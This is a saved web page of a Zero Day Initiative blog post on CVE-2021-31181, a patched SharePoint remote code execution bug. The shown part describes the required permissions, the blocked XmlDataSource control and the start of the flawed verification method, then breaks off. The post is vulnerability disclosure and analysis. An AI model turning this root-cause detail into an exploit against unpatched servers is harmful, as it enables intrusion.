Polynesia","code":"PF","phoneCode":"+689"},{"name":"Gabon","code":"GA","phoneCode":"+241"},{"name":"Gambia","code":"GM","phoneCode":"+220"},{"name":"Georgia","code":"GE","phoneCode":"+995"},{"name":"Germany","code":"DE","phoneCode":"+49"},{"name":"Ghana","code":"GH","phoneCode":"+233"},{"name":"Gibraltar","code":"GI","phoneCode":"+350"},{"name":"Greece","code":"GR","phoneCode":"+30"},{"name":"Greenland","code":"GL","phoneCode":"+299"},{"name":"Grenada","code":"GD","phoneCode":"+1"},{"name":"Guadeloupe","code":"GP","phoneCode":"+590"},{"name":"Guam","code":"GU","phoneCode":"+1"},{"name":"Guatemala","code":"GT","phoneCode":"+502"},{"name":"Guernsey","code":"GG","phoneCode":"+44"},{"name":"Guinea","code":"GN","phoneCode":"+224"},{"name":"Guinea-Bissau","code":"GW","phoneCode":"+245"},{"name":"Guyana","code":"GY","phoneCode":"+592"},{"name":"Haiti","code":"HT","phoneCode":"+509"},{"name":"Honduras","code":"HN","phoneCode":"+504"},{"name":"Hong Kong SAR China","code":"HK","phoneCode":"+852"},{"name":"Hungary","code":"HU","phoneCode":"+36"},{"name":"Iceland","code":"IS","phoneCode":"+354"},{"name":"India","code":"IN","phoneCode":"+91"},{"name":"Indonesia","code":"ID","phoneCode":"+62"},{"name":"Iran","code":"IR","phoneCode":"+98"},{"name":"Iraq","code":"IQ","phoneCode":"+964"},{"name":"Ireland","code":"IE","phoneCode":"+353"},{"name":"Isle of Man","code":"IM","phoneCode":"+44"},{"name":"Israel","code":"IL","phoneCode":"+972"},{"name":"Italy","code":"IT","phoneCode":"+39"},{"name":"Jamaica","code":"JM","phoneCode":"+1"},{"name":"Japan","code":"JP","phoneCode":"+81"},{"name":"Jersey","code":"JE","phoneCode":"+44"},{"name":"Jordan","code":"JO","phoneCode":"+962"},{"name":"Kazakhstan","code":"KZ","phoneCode":"+7"},{"name":"Kenya","code":"KE","phoneCode":"+254"},{"name":"Kiribati","code":"KI","phoneCode":"+686"},{"name":"Kosovo","code":"XK","phoneCode":"+383"},{"name":"Kuwait","code":"KW","phoneCode":"+965"},{"name":"Kyrgyzstan","code":"KG","phoneCode":"+996"},{"name":"Laos","code":"LA","phoneCode":"+856"},{"name":"Latvia","code":"LV","phoneCode":"+371"},{"name":"Lebanon","code":"LB","phoneCode":"+961"},{"name":"Lesotho","code":"LS","phoneCode":"+266"},{"name":"Liberia","code":"LR","phoneCode":"+231"},{"name":"Libya","code":"LY","phoneCode":"+218"},{"name":"Liechtenstein","code":"LI","phoneCode":"+423"},{"name":"Lithuania","code":"LT","phoneCode":"+370"},{"name":"Luxembourg","code":"LU","phoneCode":"+352"},{"name":"Macao SAR China","code":"MO","phoneCode":"+853"},{"name":"Madagascar","code":"MG","phoneCode":"+261"},{"name":"Malawi","code":"MW","phoneCode":"+265"},{"name":"Malaysia","code":"MY","phoneCode":"+60"},{"name":"Maldives","code":"MV","phoneCode":"+960"},{"name":"Mali","code":"ML","phoneCode":"+223"},{"name":"Malta","code":"MT","phoneCode":"+356"},{"name":"Marshall Islands","code":"MH","phoneCode":"+692"},{"name":"Martinique","code":"MQ","phoneCode":"+596"},{"name":"Mauritania","code":"MR","phoneCode":"+222"},{"name":"Mauritius","code":"MU","phoneCode":"+230"},{"name":"Mayotte","code":"YT","phoneCode":"+262"},{"name":"Mexico","code":"MX","phoneCode":"+52"},{"name":"Micronesia","code":"FM","phoneCode":"+691"},{"name":"Moldova","code":"MD","phoneCode":"+373"},{"name":"Monaco","code":"MC","phoneCode":"+377"},{"name":"Mongolia","code":"MN","phoneCode":"+976"},{"name":"Montenegro","code":"ME","phoneCode":"+382"},{"name":"Montserrat","code":"MS","phoneCode":"+1"},{"name":"Morocco","code":"MA","phoneCode":"+212"},{"name":"Mozambique","code":"MZ","phoneCode":"+258"},{"name":"Myanmar (Burma)","code":"MM","phoneCode":"+95"},{"name":"Namibia","code":"NA","phoneCode":"+264"},{"name":"Nauru","code":"NR","phoneCode":"+674"},{"name":"Nepal","code":"NP","phoneCode":"+977"},{"name":"Netherlands","code":"NL","phoneCode":"+31"},{"name":"New Caledonia","code":"NC","phoneCode":"+687"},{"name":"New Zealand","code":"NZ","phoneCode":"+64"},{"name":"Nicaragua","code":"NI","phoneCode":"+505"},{"name":"Niger","code":"NE","phoneCode":"+227"},{"name":"Nigeria","code":"NG","phoneCode":"+234"},{"name":"Niue","code":"NU","phoneCode":"+683"},{"name":"Norfolk Island","code":"NF","phoneCode":"+672"},{"name":"Northern Mariana Islands","code":"MP","phoneCode":"+1"},{"name":"North Korea","code":"KP","phoneCode":"+850"},{"name":"North Macedonia","code":"MK","phoneCode":"+389"},{"name":"Norway","code":"NO","phoneCode":"+47"},{"name":"Oman","code":"OM","phoneCode":"+968"},{"name":"Pakistan","code":"PK","phoneCode":"+92"},{"name":"Palau","code":"PW","phoneCode":"+680"},{"name":"Palestinian Territories","code":"PS","phoneCode":"+970"},{"name":"Panama","code":"PA","phoneCode":"+507"},{"name":"Papua New Guinea","code":"PG","phoneCode":"+675"},{"name":"Paraguay","code":"PY","phoneCode":"+595"},{"name":"Peru","code":"PE","phoneCode":"+51"},{"name":"Philippines","code":"PH","phoneCode":"+63"},{"name":"Poland","code":"PL","phoneCode":"+48"},{"name":"Portugal","code":"PT","phoneCode":"+351"},{"name":"Puerto Rico","code":"PR","phoneCode":"+1"},{"name":"Qatar","code":"QA","phoneCode":"+974"},{"name":"R\u00E9union","code":"RE","phoneCode":"+262"},{"name":"Romania","code":"RO","phoneCode":"+40"},{"name":"Russia","code":"RU","phoneCode":"+7"},{"name":"Rwanda","code":"RW","phoneCode":"+250"},{"name":"Samoa","code":"WS","phoneCode":"+685"},{"name":"San Marino","code":"SM","phoneCode":"+378"},{"name":"S\u00E3o Tom\u00E9 & Pr\u00EDncipe","code":"ST","phoneCode":"+239"},{"name":"Saudi Arabia","code":"SA","phoneCode":"+966"},{"name":"Senegal","code":"SN","phoneCode":"+221"},{"name":"Serbia","code":"RS","phoneCode":"+381"},{"name":"Seychelles","code":"SC","phoneCode":"+248"},{"name":"Sierra Leone","code":"SL","phoneCode":"+232"},{"name":"Singapore","code":"SG","phoneCode":"+65"},{"name":"Sint Maarten","code":"SX","phoneCode":"+1"},{"name":"Slovakia","code":"SK","phoneCode":"+421"},{"name":"Slovenia","code":"SI","phoneCode":"+386"},{"name":"Solomon Islands","code":"SB","phoneCode":"+677"},{"name":"Somalia","code":"SO","phoneCode":"+252"},{"name":"South Africa","code":"ZA","phoneCode":"+27"},{"name":"South Korea","code":"KR","phoneCode":"+82"},{"name":"South Sudan","code":"SS","phoneCode":"+211"},{"name":"Spain","code":"ES","phoneCode":"+34"},{"name":"Sri Lanka","code":"LK","phoneCode":"+94"},{"name":"St. Barth\u00E9lemy","code":"BL","phoneCode":"+590"},{"name":"St. Helena","code":"SH","phoneCode":"+290"},{"name":"St. Kitts & Nevis","code":"KN","phoneCode":"+1"},{"name":"St. Lucia","code":"LC","phoneCode":"+1"},{"name":"St. Martin","code":"MF","phoneCode":"+590"},{"name":"St. Pierre & Miquelon","code":"PM","phoneCode":"+508"},{"name":"St. Vincent & Grenadines","code":"VC","phoneCode":"+1"},{"name":"Sudan","code":"SD","phoneCode":"+249"},{"name":"Suriname","code":"SR","phoneCode":"+597"},{"name":"Svalbard & Jan Mayen","code":"SJ","phoneCode":"+47"},{"name":"Sweden","code":"SE","phoneCode":"+46"},{"name":"Switzerland","code":"CH","phoneCode":"+41"},{"name":"Syria","code":"SY","phoneCode":"+963"},{"name":"Taiwan","code":"TW","phoneCode":"+886"},{"name":"Tajikistan","code":"TJ","phoneCode":"+992"},{"name":"Tanzania","code":"TZ","phoneCode":"+255"},{"name":"Thailand","code":"TH","phoneCode":"+66"},{"name":"Timor-Leste","code":"TL","phoneCode":"+670"},{"name":"Togo","code":"TG","phoneCode":"+228"},{"name":"Tokelau","code":"TK","phoneCode":"+690"},{"name":"Tonga","code":"TO","phoneCode":"+676"},{"name":"Trinidad & Tobago","code":"TT","phoneCode":"+1"},{"name":"Tristan da Cunha","code":"TA","phoneCode":"+290"},{"name":"Tunisia","code":"TN","phoneCode":"+216"},{"name":"T\u00FCrkiye","code":"TR","phoneCode":"+90"},{"name":"Turkmenistan","code":"TM","phoneCode":"+993"},{"name":"Turks & Caicos Islands","code":"TC","phoneCode":"+1"},{"name":"Tuvalu","code":"TV","phoneCode":"+688"},{"name":"U.S. Virgin Islands","code":"VI","phoneCode":"+1"},{"name":"Uganda","code":"UG","phoneCode":"+256"},{"name":"Ukraine","code":"UA","phoneCode":"+380"},{"name":"United Arab Emirates","code":"AE","phoneCode":"+971"},{"name":"United Kingdom","code":"GB","phoneCode":"+44"},{"name":"United States","code":"US","phoneCode":"+1"},{"name":"Uruguay","code":"UY","phoneCode":"+598"},{"name":"Uzbekistan","code":"UZ","phoneCode":"+998"},{"name":"Vanuatu","code":"VU","phoneCode":"+678"},{"name":"Vatican City","code":"VA","phoneCode":"+39"},{"name":"Venezuela","code":"VE","phoneCode":"+58"},{"name":"Vietnam","code":"VN","phoneCode":"+84"},{"name":"Wallis & Futuna","code":"WF","phoneCode":"+681"},{"name":"Western Sahara","code":"EH","phoneCode":"+212"},{"name":"Yemen","code":"YE","phoneCode":"+967"},{"name":"Zambia","code":"ZM","phoneCode":"+260"},{"name":"Zimbabwe","code":"ZW","phoneCode":"+263"}]},"localizedStrings":{"validation":{"noValidSelection":"A valid selection must be made.","invalidUrl":"Must be a valid URL.","stringTooLong":"Value should have a length no longer than {0}.","containsInvalidKey":"{0} contains an invalid key.","invalidTwitterUsername":"Must be a valid Twitter username.","valueOutsideRange":"Value must be in the range {0} to {1}.","invalidPassword":"Passwords should not contain whitespace.","missingRequiredSubfields":"{0} is missing required subfields: {1}","invalidCurrency":"Currency value should be formatted like 1234 or 123.99.","invalidMapSize":"Value should contain exactly {0} elements.","subfieldsRequired":"All fields in {0} are required.","formSubmissionFailed":"Form submission failed. Review the following information: {0}.","invalidCountryCode":"Country code should have an optional plus and up to 4 digits.","invalidDate":"This is not a real date.","required":"{0} is required.","invalidStringLength":"Value should be {0} characters long.","invalidEmail":"Email addresses should follow the format user@domain.com.","invalidListLength":"Value should be {0} elements long.","allEmpty":"Please fill out at least one form field.","missingRequiredQuestion":"Missing a required question.","invalidQuestion":"Contained an invalid question.","captchaFailure":"Captcha validation failed. Please try again.","stringTooShort":"Value should have a length of at least {0}.","invalid":"{0} is not valid.","formErrors":"Form Errors","containsInvalidValue":"{0} contains an invalid value.","invalidUnsignedNumber":"Numbers must contain only digits and no other characters.","invalidName":"Valid names contain only letters, numbers, spaces, ', or - characters."},"submit":"Submit","status":{"title":"{@} Block","learnMore":"Learn more"},"name":{"firstName":"First Name","lastName":"Last Name"},"lightbox":{"openForm":"Open Form"},"likert":{"agree":"Agree","stronglyDisagree":"Strongly Disagree","disagree":"Disagree","stronglyAgree":"Strongly Agree","neutral":"Neutral"},"time":{"am":"AM","second":"Second","pm":"PM","minute":"Minute","amPm":"AM/PM","hour":"Hour"},"notFound":"Form not found.","date":{"yyyy":"YYYY","year":"Year","mm":"MM","day":"Day","month":"Month","dd":"DD"},"phone":{"country":"Country","number":"Number","prefix":"Prefix","areaCode":"Area Code","line":"Line"},"submitError":"Unable to submit form. Please try again later.","address":{"stateProvince":"State/Province","country":"Country","zipPostalCode":"Zip/Postal Code","address2":"Address 2","address1":"Address 1","city":"City"},"email":{"signUp":"Sign up for news and updates"},"cannotSubmitDemoForm":"This is a demo form and cannot be submitted.","required":"(required)","invalidData":"Invalid form data."}}};</script><script>Squarespace.load(window);</script>
<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://www.thezdi.com/blog?format=rss">
<script type="application/ld+json">{"url":"https://www.thezdi.com","name":"Zero Day Initiative","description":"","@context":"http://schema.org","@type":"WebSite"}</script><script type="application/ld+json">{"address":"","@context":"http://schema.org","@type":"LocalBusiness"}</script><script type="application/ld+json">{"name":"Zero Day Initiative \u2014 CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability","url":"https://www.thezdi.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability","datePublished":"2021-06-02T10:35:31-0500","dateModified":"2021-06-02T10:35:31-0500","headline":"CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability","author":"The ZDI Research Team","publisher":{"name":"Zero Day Initiative","logo":{"@type":"ImageObject"},"@context":"http://schema.org","@type":"Organization"},"image":"http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/60b68fccb9f90c6ec8c02fe8/1622648131186/branch-sky-sunlight-construction-pattern-line-1346600-pxhere.com.jpg?format=1500w","@context":"http://schema.org","@type":"Article"}</script><link rel="stylesheet" type="text/css" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/site.css"><script>
if (window.location.host == "www.thezdi.com") {window.location = "https://www.zerodayinitiative.com" + window.location.pathname}</script><script>Static.COOKIE_BANNER_CAPABLE = true;</script>
<script async="" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/js(1)"></script><script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('set', 'developer_id.dZjQwMz', true);gtag('config', 'UA-93169700-1');</script><!-- End of Squarespace Headers -->
    <link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/main.css">
</head>
<body class="home" id="yui_3_17_2_1_1762949685278_101">


<div id="nav" class="group">
    <div id="navContent">
        <div class="nav__container">
            <div class="nav__header">
                <div class="global-header__logo">
                    <a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/logo-combo.svg" alt="thezdi"></a>
                </div>
                <div id="mobileNavIcon" class="js-mobile-nav-toggle">Menu</div>
                <div id="mobileOverlay"></div>
            </div>
            <nav class="nav__list" role="main-navigation">
                <ul class="list-no-bullets">
                    <li class="nav__tier1"><a href="https://www.trendmicro.com/privacy">PRIVACY</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/">WHO WE ARE</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/benefits/">HOW IT WORKS</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/blog/">BLOG</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/advisories/">ADVISORIES</a></li>
                    <li class="nav__tier1 userActions">
                        <a href="https://www.zerodayinitiative.com/portal/">LOG IN</a>
                        <a href="https://www.zerodayinitiative.com/portal/register/">SIGN UP</a>
                    </li>
                    <li>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
</div>

<!-- Begin Off Canvas Menu-->
<div class="off-canvas">
    <nav class="off-canvas__list" role="main-navigation2">
        <div class="js-mobile-nav-toggle">Menu</div>
        <ul class="topMenu">
            <li class="nav__tier1"><a href="https://www.trendmicro.com/privacy/">PRIVACY</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/">WHO WE ARE</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/benefits/">HOW IT WORKS</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/blog/">BLOG</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/advisories/">ADVISORIES</a></li>
            <li class="nav__tier1"><a class="sign-in" href="https://www.zerodayinitiative.com/portal/">LOG IN</a></li>
            <li class="nav__tier1"><a class="sign-in" href="https://www.zerodayinitiative.com/portal/register/">SIGN UP</a></li>
        </ul>
        <ul class="bottomMenu">
            <li class="nav__tier1">
                <a href="https://www.trendmicro.com/"><img src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/logo-trend.svg" alt="Trend Micro"></a>
            </li>
            <li class="nav__tier1 logo"><a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/logo-zdi.svg" alt="thezdi"></a></li>
        </ul>
    </nav>
</div>
<!-- End Off Canvas Menu -->

<div id="mainContent" class="blogDetails group subscribeAbs">
    <div id="imageMasthead" class="smaller">
        <div class="content">
            
                <h1 class="title" data-content-field="title">
                  
                CVE-2021-31181: Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability
                  
                </h1>
                <data>June 02, 2021  |  The ZDI Research Team</data>
            
        </div>
    </div>

            <div class="blog-listing blog-details" id="yui_3_17_2_1_1762949685278_100">
                <div class="subscribe-container">
                    <a href="https://www.zerodayinitiative.com/rss/" class="btn subscribe rounded">SUBSCRIBE</a>
                </div>
                <div class="section" id="yui_3_17_2_1_1762949685278_99">
                    <div class="contentBlock" id="yui_3_17_2_1_1762949685278_98">
                        <div class="contentBlockCopy" style="float: none;" id="yui_3_17_2_1_1762949685278_97">

                            <div class="group" style="max-width: 1000px;" id="yui_3_17_2_1_1762949685278_96">
                                <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Post Body" data-type="item" data-updated-on="1622577138893" id="item-60b68fccb9f90c6ec8c02fe8"><div class="row sqs-row" id="yui_3_17_2_1_1762949685278_95"><div class="col sqs-col-12 span-12" id="yui_3_17_2_1_1762949685278_94"><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-636795112ed25f1b0fb0"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">In May of 2021, Microsoft released a patch to correct <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-31181">CVE-2021-31181</a> – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as <a href="https://www.zerodayinitiative.com/advisories/ZDI-21-573/">ZDI-21-573</a>. This blog takes a deeper look at the root cause of this vulnerability.</p><p class="" style="white-space:pre-wrap;">Before this patch being made available, this vulnerability could be used by an authenticated user to execute arbitrary code on the server in the context of the service account of the SharePoint web application. For a successful attack, the attacker must have <strong><em>SPBasePermissions.ManageLists</em></strong> permissions on any SharePoint site. By default, any authenticated user can create their own site where they have the necessary permission.&nbsp;&nbsp;&nbsp; </p><p class="" style="white-space:pre-wrap;"><strong>The Vulnerability</strong></p><p class="" style="white-space:pre-wrap;">This attack is possible due to insufficient validation of user input in the <strong><em>EditingPageParser.VerifyControlOnSafeList() </em></strong>method. This method verifies user input against a list of unsafe controls and should raise an exception if any control is not marked as safe by the <strong><em>SafeControl</em></strong> elements as specified in <strong>web.config</strong>.</p><p class="" style="white-space:pre-wrap;">A good example of an unsafe control that is forbidden by SharePoint is <strong><em>System.Web.UI.WebControls.XmlDataSource.</em></strong> This control is dangerous because it would allow an attacker to get information from an arbitrary XML file on the server. As we will see, this could be used not only for information disclosure but even for code execution.</p><p class="" style="white-space:pre-wrap;">We can see that it is marked as unsafe via a <strong><em>SafeControl</em></strong> element in <strong>web.config</strong>:</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/5fbad1d0bdb7e362483442c34863feef.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1622577090871_21776"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_68" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/5fbad1d0bdb7e362483442c34863feef..download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/gist-embed-0ac919313390.css"><div id="gist109841029" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-31181-snippet-1-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-31181-snippet-1.xml content, created by zdi-team on 02:58PM on June 01, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-31181-snippet-1.xml">
        <tbody><tr>
          <td id="file-cve-2021-31181-snippet-1-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-31181-snippet-1-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">SafeControl</span> <span class="pl-e">Assembly</span>=<span class="pl-s"><span class="pl-pds">"</span>System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a<span class="pl-pds">"</span></span> <span class="pl-e">Namespace</span>=<span class="pl-s"><span class="pl-pds">"</span>System.Web.UI.WebControls<span class="pl-pds">"</span></span> <span class="pl-e">TypeName</span>=<span class="pl-s"><span class="pl-pds">"</span>XmlDataSource<span class="pl-pds">"</span></span> <span class="pl-e">Safe</span>=<span class="pl-s"><span class="pl-pds">"</span>False<span class="pl-pds">"</span></span> <span class="pl-e">AllowRemoteDesigner</span>=<span class="pl-s"><span class="pl-pds">"</span>False<span class="pl-pds">"</span></span> <span class="pl-e">SafeAgainstScript</span>=<span class="pl-s"><span class="pl-pds">"</span>False<span class="pl-pds">"</span></span> /&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/5fbad1d0bdb7e362483442c34863feef/raw/6573eecd8f4a4dcd2dee7e6a1fd18c10636f8b4b/CVE-2021-31181-snippet-1.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/5fbad1d0bdb7e362483442c34863feef#file-cve-2021-31181-snippet-1-xml" class="Link--inTextBlock">
          CVE-2021-31181-snippet-1.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_22615"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Because of this, an attacker should not be able to instantiate this control. However, we will see how we can bypass verification in <strong><em>EditingPageParser.VerifyControlOnSafeList()</em>.</strong></p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/133951a87d0103c3809359f4aa482a77.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1622577090871_23137"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_71" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/133951a87d0103c3809359f4aa482a77..download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/gist-embed-0ac919313390.css"><div id="gist109841047" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-31181-snippet-2-cs" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-31181-snippet-2.cs content, created by zdi-team on 02:59PM on June 01, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-31181-snippet-2.cs">
        <tbody><tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// Microsoft.SharePoint.EditingPageParser </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">internal</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">void</span> <span class="pl-s1">VerifyControlOnSafeList</span><span class="pl-kos">(</span><span class="pl-smi">string</span> <span class="pl-s1">dscXml</span><span class="pl-kos">,</span> <span class="pl-smi">RegisterDirectiveManager</span> <span class="pl-s1">registerDirectiveManager</span><span class="pl-kos">,</span> <span class="pl-smi">SPWeb</span> <span class="pl-s1">web</span><span class="pl-kos">,</span> <span class="pl-smi">bool</span> <span class="pl-s1">blockServerSideIncludes</span> <span class="pl-c1">=</span> <span class="pl-c1">false</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">Hashtable</span> <span class="pl-s1">hashtable</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">Hashtable</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">Hashtable</span> <span class="pl-s1">hashtable2</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">Hashtable</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">List</span><span class="pl-c1">&lt;</span><span class="pl-smi">string</span><span class="pl-c1">&gt;</span> <span class="pl-s1">list</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">List</span><span class="pl-c1">&lt;</span><span class="pl-smi">string</span><span class="pl-c1">&gt;</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-s1">EditingPageParser</span><span class="pl-kos">.</span><span class="pl-en">InitializeRegisterTable</span><span class="pl-kos">(</span><span class="pl-s1">hashtable</span><span class="pl-kos">,</span> <span class="pl-s1">registerDirectiveManager</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-s1">EditingPageParser</span><span class="pl-kos">.</span><span class="pl-en">ParseStringInternal</span><span class="pl-kos">(</span><span class="pl-s1">dscXml</span><span class="pl-kos">,</span> <span class="pl-s1">hashtable2</span><span class="pl-kos">,</span> <span class="pl-s1">hashtable</span><span class="pl-kos">,</span> <span class="pl-s1">list</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">blockServerSideIncludes</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">list</span><span class="pl-kos">.</span><span class="pl-s1">Count</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-31181-snippet-2-cs-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2021-31181-snippet-2-cs-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span> </td>
